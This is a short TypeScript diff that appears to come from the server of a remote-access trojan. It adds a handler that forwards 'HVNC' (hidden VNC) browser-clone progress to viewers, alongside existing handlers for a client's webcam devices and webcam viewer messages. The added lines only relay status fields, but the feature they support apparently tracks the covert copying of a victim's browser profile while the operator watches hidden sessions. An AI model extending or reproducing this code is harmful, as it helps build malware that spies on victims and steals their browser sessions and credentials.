@@ -433,6 +433,19 @@ export function handleWebcamDevices(clientId: string, payload: any) {
   }
 }
 
+export function handleHVNCCloneProgress(clientId: string, payload: any) {
+  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
+    safeSendViewer(session.viewer, {
+      type: "hvnc_clone_progress",
+      browser: String(payload.browser || ""),
+      percent: Number(payload.percent) || 0,
+      copiedBytes: Number(payload.copiedBytes) || 0,
+      totalBytes: Number(payload.totalBytes) || 0,
+      status: String(payload.status || ""),
+    });
+  }
+}
+
 export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
   const payload = decodeViewerPayload(raw);
   if (!payload || typeof payload.type !== "string") return;
